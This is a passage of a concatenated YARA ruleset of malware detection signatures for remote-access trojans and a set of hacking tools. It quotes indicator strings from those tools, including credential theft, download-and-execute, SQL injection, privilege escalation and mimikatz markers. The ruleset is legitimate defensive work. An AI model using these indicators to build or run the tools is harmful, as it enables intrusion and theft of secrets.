\"Users-INFO\"\n  $SoftwareInfo = \"Software-INFO\"\n  $AddressFormat = \"%02X-%02X-%02X-%02X-%02X-%02X\"\n  $proxy_str = \"(from environment) = %s\"\n\n  $netuserfun = \"NetUserEnum\"\n  $networkparams = \"GetNetworkParams\"\n\n condition:\n  all of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\n\nrule TerminatorRat : RAT \n{\n\tmeta:\n\t\tdescription = \"Terminator RAT\" \n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdate = \"2013-10-24\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.0\" \n\t\tref1 = \"http://www.fireeye.com/blog/technical/malware-research/2013/10/evasive-tactics-terminator-rat.html\" \n\n\tstrings:\n\t\t$a = \"Accelorator\"\n\t\t$b = \"<html><title>12356</title><body>\"\n\n\tcondition:\n\t\tall of them\n}\n\n\n\nrule TROJAN_Notepad_shell_crew : Trojan {\n        meta:\n                author = \"RSA_IR\"\n                Date     = \"4Jun13\"\n                File     = \"notepad.exe v 1.1\"\n                MD5      = \"106E63DBDA3A76BEEB53A8BBD8F98927\"\n        strings:\n                $s1 = \"75BAA77C842BE168B0F66C42C7885997\"\n                $s2 = \"B523F63566F407F3834BCC54AAA32524\"\n        condition:\n                $s1 or $s2\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule Xtreme\n{\n    meta:\n        description = \"Xtreme RAT\"\n\tauthor = \"botherder https://github.com/botherder\"\n\n    strings:\n        $string1 = /(X)tremeKeylogger/ wide ascii\n        $string2 = /(X)tremeRAT/ wide ascii\n        $string3 = /(X)TREMEUPDATE/ wide ascii\n        $string4 = /(S)TUBXTREMEINJECTED/ wide ascii\n\n        $unit1 = /(U)nitConfigs/ wide ascii\n        $unit2 = /(U)nitGetServer/ wide ascii\n        $unit3 = /(U)nitKeylogger/ wide ascii\n        $unit4 = /(U)nitCryptString/ wide ascii\n        $unit5 = /(U)nitInstallServer/ wide ascii\n        $unit6 = /(U)nitInjectServer/ wide ascii\n        $unit7 = /(U)nitBinder/ wide ascii\n        $unit8 = /(U)nitInjectProcess/ wide ascii\n\n    condition:\n        5 of them\n}\n\nrule xtreme_rat : Trojan\n{\n\tmeta:\n\t\tauthor=\"Kevin Falcoz\"\n\t\tdate=\"23/02/2013\"\n\t\tdescription=\"Xtreme RAT\"\n\t\n\tstrings:\n\t\t$signature1={58 00 54 00 52 00 45 00 4D 00 45} /*X.T.R.E.M.E*/\n\t\t\n\tcondition:\n\t\t$signature1\n}\n\nrule XtremeRATCode : XtremeRAT Family \n{\n    meta:\n        description = \"XtremeRAT code features\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-09\"\n    \n    strings:\n        // call; fstp st\n        $ = { E8 ?? ?? ?? ?? DD D8 }\n        // hiding string\n        $ = { C6 85 ?? ?? ?? ?? 4D C6 85 ?? ?? ?? ?? 70 C6 85 ?? ?? ?? ?? 64 C6 85 ?? ?? ?? ?? 62 C6 85 ?? ?? ?? ?? 6D }\n    \n    condition:\n        all of them\n}\n\nrule XtremeRATStrings : XtremeRAT Family\n{\n    meta:\n        description = \"XtremeRAT Identifying Strings\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-09\"\n        \n    strings:\n        $ = \"dqsaazere\"\n        $ = \"-GCCLIBCYGMING-EH-TDM1-SJLJ-GTHR-MINGW32\"\n        \n    condition:\n        all of them\n}\n\nrule XtremeRAT : Family\n{\n    meta:\n        description = \"XtremeRAT\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-09\"\n        \n    condition:\n        XtremeRATCode or XtremeRATStrings\n}\n\nrule xtremrat : rat\n{\n\tmeta:\n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdescription = \"Xtrem RAT v3.5\"\n\t\tdate = \"2012-07-12\" \n\t\tversion = \"1.0\" \n\t\tfiletype = \"memory\"\n\n\tstrings:\n\t\t$a = \"XTREME\" wide\n\t\t$b = \"XTREMEBINDER\" wide\n\t\t$c = \"STARTSERVERBUFFER\" wide\n\t\t$d = \"SOFTWARE\\\\XtremeRAT\" wide\n\t\t$e = \"XTREMEUPDATE\" wide\n\t\t$f = \"XtremeKeylogger\" wide\n\t\t$g = \"myversion|3.5\" wide\n\t\t$h = \"xtreme rat\" wide nocase\n\tcondition:\n\t\t2 of them\n}\n\nrule xtreme_rat_0\n{ \n\tmeta:\n\t\tmaltype = \"Xtreme RAT\"\n\t\treference = \"http://blog.trendmicro.com/trendlabs-security-intelligence/xtreme-rat-targets-israeli-government/\"\n\tstrings:\n\t\t$type=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid=\"5156\"\n\t\t$data=\"windows\\\\system32\\\\sethc.exe\"\n\n\t\t$type1=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid1=\"4688\"\n\t\t$data1=\"AppData\\\\Local\\\\Temp\\\\Microsoft Word.exe\"\n\tcondition:\n\t\tall of them\n}\n\nrule xtreme_rat_1\n{ \n\tmeta:\n\t\tmaltype = \"Xtreme RAT\"\n\t\tref = \"https://github.com/reed1713\"\n\t\treference = \"http://blog.trendmicro.com/trendlabs-security-intelligence/xtreme-rat-targets-israeli-government/\"\n\tstrings:\n\t\t$type=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid=\"5156\"\n\t\t$data=\"windows\\\\system32\\\\sethc.exe\"\n\n\t\t$type1=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid1=\"4688\"\n\t\t$data1=\"AppData\\\\Local\\\\Temp\\\\Microsoft Word.exe\"\n\tcondition:\n\t\tall of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule zoxPNG_RAT\n{\n    meta:\n        Author      = \"Novetta Advanced Research Group\"\n        Date        = \"2014/11/14\"\n        Description = \"ZoxPNG RAT, url inside\"\n        Reference   = \"http://www.novetta.com/wp-content/uploads/2014/11/ZoxPNG.pdf\"\n\n    strings: \n        $url = \"png&w=800&h=600&ei=CnJcUcSBL4rFkQX444HYCw&zoom=1&ved=1t:3588,r:1,s:0,i:92&iact=rc&dur=368&page=1&tbnh=184&tbnw=259&start=0&ndsp=20&tx=114&ty=58\"\n\n    condition: \n        $url\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\nrule jRAT_conf : RAT \n{\n\tmeta:\n\t\tdescription = \"jRAT configuration\" \n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdate = \"2013-10-11\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.0\" \n\t\tref1 = \"https://github.com/MalwareLu/config_extractor/blob/master/config_jRAT.py\" \n\t\tref2 = \"http://www.ghettoforensics.com/2013/10/dumping-malware-configuration-data-from.html\" \n\n\tstrings:\n\t\t$a = /port=[0-9]{1,5}SPLIT/ \n\n\tcondition: \n\t\t$a\n}\n\nrule xRAT : RAT\n{\n    meta:\n        author = \" Kevin Breen <kevin@techanarchy.net>\"\n        date = \"2014/04\"\n        ref = \"http://malwareconfig.com/stats/xRat\"\n        maltype = \"Remote Access Trojan\"\n        filetype = \"exe\"\n\n    strings:\n        $v1a = \"DecodeProductKey\"\n        $v1b = \"StartHTTPFlood\"\n        $v1c = \"CodeKey\"\n        $v1d = \"MESSAGEBOX\"\n        $v1e = \"GetFilezillaPasswords\"\n        $v1f = \"DataIn\"\n        $v1g = \"UDPzSockets\"\n        $v1h = {52 00 54 00 5F 00 52 00 43 00 44 00 41 00 54 00 41}\n\n        $v2a = \"<URL>k__BackingField\"\n        $v2b = \"<RunHidden>k__BackingField\"\n        $v2c = \"DownloadAndExecute\"\n        $v2d = \"-CHECK & PING -n 2 127.0.0.1 & EXIT\" wide\n        $v2e = \"england.png\" wide\n        $v2f = \"Showed Messagebox\" wide\n    condition:\n        all of ($v1*) or all of ($v2*)\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\nrule xRAT20 : RAT\n{\nmeta:\n\tauthor = \"Rottweiler\"\n\tdate = \"2015-08-20\"\n\tdescription = \"Identifies xRAT 2.0 samples\"\n\tmaltype = \"Remote Access Trojan\"\n\thash0 = \"cda610f9cba6b6242ebce9f31faf5d9c\"\n\thash1 = \"60d7b0d2dfe937ac6478807aa7043525\"\n\thash2 = \"d1b577fbfd25cc5b873b202cfe61b5b8\"\n\thash3 = \"1820fa722906569e3f209d1dab3d1360\"\n\thash4 = \"8993b85f5c138b0afacc3ff04a2d7871\"\n\thash5 = \"0c231ed8a800b0f17f897241f1d5f4e3\"\n\thash1 = \"60d7b0d2dfe937ac6478807aa7043525\"\n\thash8 = \"2c198e3e0e299a51e5d955bb83c62a5e\"\n\tsample_filetype = \"exe\"\n\tyaragenerator = \"https://github.com/Xen0ph0n/YaraGenerator\"\nstrings:\n\t$string0 = \"GetDirectory: File not found\" wide\n\t$string1 = \"<>m__Finally8\"\n\t$string2 = \"Secure\"\n\t$string3 = \"ReverseProxyClient\"\n\t$string4 = \"DriveDisplayName\"\n\t$string5 = \"<IsError>k__BackingField\"\n\t$string6 = \"set_InstallPath\"\n\t$string7 = \"memcmp\"\n\t$string8 = \"urlHistory\"\n\t$string9 = \"set_AllowAutoRedirect\"\n\t$string10 = \"lpInitData\"\n\t$string11 = \"reader\"\n\t$string12 = \"<FromRawDataGlobal>d__f\"\n\t$string13 = \"mq.png\" wide\n\t$string14 = \"remove_KeyDown\"\n\t$string15 = \"ProtectedData\"\n\t$string16 = \"m_hotkeys\"\n\t$string17 = \"get_Hour\"\n\t$string18 = \"\\\\mozglue.dll\" wide\ncondition:\n\t18 of them\n}\n\nrule mswin_check_lm_group {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file mswin_check_lm_group.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"115d87d7e7a3d08802a9e5fd6cd08e2ec633c367\"\n\tstrings:\n\t\t$s1 = \"Valid_Global_Groups: checking group membership of '%s\\\\%s'.\" fullword ascii\n\t\t$s2 = \"Usage: %s [-D domain][-G][-P][-c][-d][-h]\" fullword ascii\n\t\t$s3 = \"-D    default user Domain\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 380KB and all of them\n}\n\nrule WAF_Bypass {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file WAF-Bypass.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"860a9d7aac2ce3a40ac54a4a0bd442c6b945fa4e\"\n\tstrings:\n\t\t$s1 = \"Email: blacksplitn@gmail.com\" fullword wide\n\t\t$s2 = \"User-Agent:\" fullword wide\n\t\t$s3 = \"Send Failed.in RemoteThread\" fullword ascii\n\t\t$s4 = \"www.example.com\" fullword wide\n\t\t$s5 = \"Get Domain:%s IP Failed.\" fullword ascii\n\t\t$s6 = \"Connect To Server Failed.\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 7992KB and 5 of them\n}\n\nrule Guilin_veterans_cookie_spoofing_tool {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Guilin veterans cookie spoofing tool.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"06b1969bc35b2ee8d66f7ce8a2120d3016a00bb1\"\n\tstrings:\n\t\t$s0 = \"kernel32.dll^G\" fullword ascii\n\t\t$s1 = \"\\\\.Sus\\\"B\" fullword ascii\n\t\t$s4 = \"u56Load3\" fullword ascii\n\t\t$s11 = \"O MYTMP(iM) VALUES (\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1387KB and all of them\n}\n\nrule MarathonTool {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file MarathonTool.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"084a27cd3404554cc799d0e689f65880e10b59e3\"\n\tstrings:\n\t\t$s0 = \"MarathonTool\" ascii\n\t\t$s17 = \"/Blind SQL injection tool based in heavy queries\" fullword ascii\n\t\t$s18 = \"SELECT UNICODE(SUBSTRING((system_user),{0},1))\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1040KB and all of them\n}\n\nrule PLUGIN_TracKid {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file TracKid.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"a114181b334e850d4b33e9be2794f5bb0eb59a09\"\n\tstrings:\n\t\t$s0 = \"E-mail: cracker_prince@163.com\" fullword ascii\n\t\t$s1 = \".\\\\TracKid Log\\\\%s.txt\" fullword ascii\n\t\t$s2 = \"Coded by prince\" fullword ascii\n\t\t$s3 = \"TracKid.dll\" fullword ascii\n\t\t$s4 = \".\\\\TracKid Log\" fullword ascii\n\t\t$s5 = \"%08x -- %s\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and 3 of them\n}\n\nrule Pc_pc2015 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file pc2015.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"de4f098611ac9eece91b079050b2d0b23afe0bcb\"\n\tstrings:\n\t\t$s0 = \"\\\\svchost.exe\" fullword ascii\n\t\t$s1 = \"LON\\\\OD\\\\O-\\\\O)\\\\O%\\\\O!\\\\O=\\\\O9\\\\O5\\\\O1\\\\O\" fullword ascii\n\t\t$s8 = \"%s%08x.001\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 309KB and all of them\n}\n\nrule sekurlsa {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file sekurlsa.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5\"\n\tstrings:\n\t\t$s1 = \"Bienvenue dans un processus distant\" fullword wide\n\t\t$s2 = \"Format d'appel invalide : addLogonSession [idSecAppHigh] idSecAppLow Utilisateur\" wide\n\t\t$s3 = \"SECURITY\\\\Policy\\\\Secrets\" fullword wide\n\t\t$s4 = \"Injection de donn\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1150KB and all of them\n}\n\nrule mysqlfast {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file mysqlfast.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"32b60350390fe7024af7b4b8fbf50f13306c546f\"\n\tstrings:\n\t\t$s2 = \"Invalid password hash: %s\" fullword ascii\n\t\t$s3 = \"-= MySql Hash Cracker =- \" fullword ascii\n\t\t$s4 = \"Usage: %s hash\" fullword ascii\n\t\t$s5 = \"Hash: %08lx%08lx\" fullword ascii\n\t\t$s6 = \"Found pass: \" fullword ascii\n\t\t$s7 = \"Pass not found\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 900KB and 4 of them\n}\n\nrule DTools2_02_DTools {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file DTools.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"9f99771427120d09ec7afa3b21a1cb9ed720af12\"\n\tstrings:\n\t\t$s0 = \"kernel32.dll\" ascii\n\t\t$s1 = \"TSETPASSWORDFORM\" fullword wide\n\t\t$s2 = \"TGETNTUSERNAMEFORM\" fullword wide\n\t\t$s3 = \"TPORTFORM\" fullword wide\n\t\t$s4 = \"ShellFold\" fullword ascii\n\t\t$s5 = \"DefaultPHotLigh\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule dll_PacketX {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file PacketX.dll - ActiveX wrapper for WinPcap packet capture library\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\tscore = 50\n\t\thash = \"3f0908e0a38512d2a4fb05a824aa0f6cf3ba3b71\"\n\tstrings:\n\t\t$s9 = \"[Failed to load winpcap packet.dll.\" wide\n\t\t$s10 = \"PacketX Version\" wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1920KB and all of them\n}\n\nrule SqlDbx_zhs {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file SqlDbx_zhs.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"e34228345498a48d7f529dbdffcd919da2dea414\"\n\tstrings:\n\t\t$s0 = \"S.failed_logins \\\"Failed Login Attempts\\\", \" fullword ascii\n\t\t$s7 = \"SELECT ROLE, PASSWORD_REQUIRED FROM SYS.DBA_ROLES ORDER BY ROLE\" fullword ascii\n\t\t$s8 = \"SELECT spid 'SPID', status 'Status', db_name (dbid) 'Database', loginame 'Login'\" ascii\n\t\t$s9 = \"bcp.exe <:schema:>.<:table:> out \\\"<:file:>\\\" -n -S <:server:> -U <:user:> -P <:\" ascii\n\t\t$s11 = \"L.login_policy_name AS \\\"Login Policy\\\", \" fullword ascii\n\t\t$s12 = \"mailto:support@sqldbx.com\" fullword ascii\n\t\t$s15 = \"S.last_login_time \\\"Last Login\\\", \" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and 4 of them\n}\n\nrule ms10048_x86 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms10048-x86.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"e57b453966e4827e2effa4e153f2923e7d058702\"\n\tstrings:\n\t\t$s1 = \"[ ] Resolving PsLookupProcessByProcessId\" fullword ascii\n\t\t$s2 = \"The target is most likely patched.\" fullword ascii\n\t\t$s3 = \"Dojibiron by Ronald Huizer, (c) master@h4cker.us .\" fullword ascii\n\t\t$s4 = \"[ ] Creating evil window\" fullword ascii\n\t\t$s5 = \"%sHANDLEF_INDESTROY\" fullword ascii\n\t\t$s6 = \"[+] Set to %d exploit half succeeded\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 4 of them\n}\n\nrule Dos_ch {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ch.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"60bbb87b08af840f21536b313a76646e7c1f0ea7\"\n\tstrings:\n\t\t$s0 = \"/Churraskito/-->Usage: Churraskito.exe \\\"command\\\" \" fullword ascii\n\t\t$s4 = \"fuck,can't find WMI process PID.\" fullword ascii\n\t\t$s5 = \"/Churraskito/-->Found token %s \" fullword ascii\n\t\t$s8 = \"wmiprvse.exe\" fullword ascii\n\t\t$s10 = \"SELECT * FROM IIsWebInfo\" fullword ascii\n\t\t$s17 = \"WinSta0\\\\Default\" fullword ascii  /* Goodware String - occured 22 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 260KB and 3 of them\n}\n\nrule DUBrute_DUBrute {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file DUBrute.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"8aaae91791bf782c92b97c6e1b0f78fb2a9f3e65\"\n\tstrings:\n\t\t$s1 = \"IP - %d; Login - %d; Password - %d; Combination - %d\" fullword ascii\n\t\t$s2 = \"IP - 0; Login - 0; Password - 0; Combination - 0\" fullword ascii\n\t\t$s3 = \"Create %d IP@Loginl;Password\" fullword ascii\n\t\t$s4 = \"UBrute.com\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1020KB and all of them\n}\n\nrule CookieTools {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file CookieTools.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b6a3727fe3d214f4fb03aa43fb2bc6fadc42c8be\"\n\tstrings:\n\t\t$s0 = \"http://210.73.64.88/doorway/cgi-bin/getclientip.asp?IP=\" fullword ascii\n\t\t$s2 = \"No data to read.$Can not bind in port range (%d - %d)\" fullword wide\n\t\t$s3 = \"Connection Closed Gracefully.;Could not bind socket. Address and port are alread\" wide\n\t\t$s8 = \"OnGetPasswordP\" fullword ascii\n\t\t$s12 = \"http://www.chinesehack.org/\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 5000KB and 2 of them\n}\n\nrule update_PcInit {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file PcInit.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"a6facc4453f8cd81b8c18b3b3004fa4d8e2f5344\"\n\tstrings:\n\t\t$s1 = \"\\\\svchost.exe\" fullword ascii\n\t\t$s2 = \"%s%08x.001\" fullword ascii\n\t\t$s3 = \"Global\\\\ps%08x\" fullword ascii\n\t\t$s4 = \"drivers\\\\\" fullword ascii /* Goodware String - occured 2 times */\n\t\t$s5 = \"StrStrA\" fullword ascii /* Goodware String - occured 43 times */\n\t\t$s6 = \"StrToIntA\" fullword ascii /* Goodware String - occured 44 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 50KB and all of them\n}\n\nrule dat_NaslLib {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file NaslLib.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"fb0d4263118faaeed2d68e12fab24c59953e862d\"\n\tstrings:\n\t\t$s1 = \"nessus_get_socket_from_connection: fd <%d> is closed\" fullword ascii\n\t\t$s2 = \"[*] \\\"%s\\\" completed, %d/%d/%d/%d:%d:%d - %d/%d/%d/%d:%d:%d\" fullword ascii\n\t\t$s3 = \"A FsSniffer backdoor seems to be running on this port%s\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1360KB and all of them\n}\n\nrule Dos_1 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file 1.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b554f0687a12ec3a137f321cc15e052ff219f28c\"\n\tstrings:\n\t\t$s1 = \"/churrasco/-->Usage: Churrasco.exe \\\"command to run\\\"\" fullword ascii\n\t\t$s2 = \"/churrasco/-->Done, command should have ran as SYSTEM!\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule OtherTools_servu {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file svu.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5c64e6879a9746a0d65226706e0edc7a\"\n\tstrings:\n\t\t$s0 = \"MZKERNEL32.DLL\" fullword ascii\n\t\t$s1 = \"UpackByDwing@\" fullword ascii\n\t\t$s2 = \"GetProcAddress\" fullword ascii\n\t\t$s3 = \"WriteFile\" fullword ascii\n\tcondition:\n\t\t$s0 at 0 and filesize < 50KB and all of them\n}\n\nrule ustrrefadd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ustrrefadd.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b371b122460951e74094f3db3016264c9c8a0cfa\"\n\tstrings:\n\t\t$s0 = \"E-Mail  : admin@luocong.com\" fullword ascii\n\t\t$s1 = \"Homepage: http://www.luocong.com\" fullword ascii\n\t\t$s2 = \": %d  -  \" fullword ascii\n\t\t$s3 = \"ustrreffix.dll\" fullword ascii\n\t\t$s5 = \"Ultra String Reference plugin v%d.%02d\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 320KB and all of them\n}\n\nrule XScanLib {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file XScanLib.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"c5cb4f75cf241f5a9aea324783193433a42a13b0\"\n\tstrings:\n\t\t$s4 = \"XScanLib.dll\" fullword ascii\n\t\t$s6 = \"Ports/%s/%d\" fullword ascii\n\t\t$s8 = \"DEFAULT-TCP-PORT\" fullword ascii\n\t\t$s9 = \"PlugCheckTcpPort\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 360KB and all of them\n}\n\nrule IDTools_For_WinXP_IdtTool {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file IdtTool.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ebab6e4cb7ea82c8dc1fe4154e040e241f4672c6\"\n\tstrings:\n\t\t$s2 = \"IdtTool.sys\" fullword ascii\n\t\t$s4 = \"Idt Tool bY tMd[CsP]\" fullword wide\n\t\t$s6 = \"\\\\\\\\.\\\\slIdtTool\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 25KB and all of them\n}\n\nrule GoodToolset_ms11046 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms11046.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"f8414a374011fd239a6c6d9c6ca5851cd8936409\"\n\tstrings:\n\t\t$s1 = \"[*] Token system command\" fullword ascii\n\t\t$s2 = \"[*] command add user 90sec 90sec\" fullword ascii\n\t\t$s3 = \"[*] Add to Administrators success\" fullword ascii\n\t\t$s4 = \"[*] User has been successfully added\" fullword ascii\n\t\t$s5 = \"Program: %s%s%s%s%s%s%s%s%s%s%s\" fullword ascii  /* Goodware String - occured 3 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 840KB and 2 of them\n}\n\nrule Cmdshell32 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Cmdshell32.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"3c41116d20e06dcb179e7346901c1c11cd81c596\"\n\tstrings:\n\t\t$s1 = \"cmdshell.exe\" fullword wide\n\t\t$s2 = \"cmdshell\" fullword ascii\n\t\t$s3 = \"[Root@CmdShell ~]#\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 62KB and all of them\n}\n\nrule Sniffer_analyzer_SSClone_1210_full_version {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Sniffer analyzer SSClone 1210 full version.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"6882125babb60bd0a7b2f1943a40b965b7a03d4e\"\n\tstrings:\n\t\t$s0 = \"http://www.vip80000.com/hot/index.html\" fullword ascii\n\t\t$s1 = \"GetConnectString\" fullword ascii\n\t\t$s2 = \"CnCerT.Safe.SSClone.dll\" fullword ascii\n\t\t$s3 = \"(*.JPG;*.BMP;*.GIF;*.ICO;*.CUR)|*.JPG;*.BMP;*.GIF;*.ICO;*.CUR|JPG\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3580KB and all of them\n}\n\nrule x64_klock {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file klock.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"44825e848bc3abdb6f31d0a49725bb6f498e9ccc\"\n\tstrings:\n\t\t$s1 = \"Bienvenue dans un processus distant\" fullword wide\n\t\t$s2 = \"klock.dll\" fullword ascii\n\t\t$s3 = \"Erreur : le bureau courant (\" fullword wide\n\t\t$s4 = \"klock de mimikatz pour Windows\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 907KB and all of them\n}\n\nrule Dos_Down32 